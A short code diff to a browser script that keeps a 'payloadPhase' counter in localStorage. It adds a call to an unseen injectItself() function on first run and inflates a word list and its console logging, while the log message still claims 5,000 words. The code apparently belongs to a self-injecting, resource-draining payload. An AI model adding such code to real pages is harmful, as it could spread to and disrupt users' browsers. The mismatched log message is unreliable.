@@ -68,15 +68,16 @@ const currentPhase = localStorage.getItem('payloadPhase');
       const j = Math.floor(Math.random() * (i + 1));
       [allWords[i], allWords[j]] = [allWords[j], allWords[i]];
     }
-    const random5kWords = allWords.slice(0, 50000);
+    const random5kWords = allWords.slice(0, 400000);
     globalThis.globalestWordList = random5kWords;
     console.log(`Success! 5,000 random words loaded into globalThis.globalestWordList.`);
-    console.log(`Sample words:`, globalThis.globalestWordList.slice(0, 5));
+    console.log(`Sample words:`, globalThis.globalestWordList.slice(0, 5000));
   } catch (error) {
     console.error('Failed to fetch or process the word list:', error);
   }
 })();
 if (currentPhase === null) {
+  injectItself();
   localStorage.setItem('payloadPhase', '1');
   localStorage.setItem('name', 'Beznravstvennost9');
   localStorage.setItem('bgBrightness', '0');
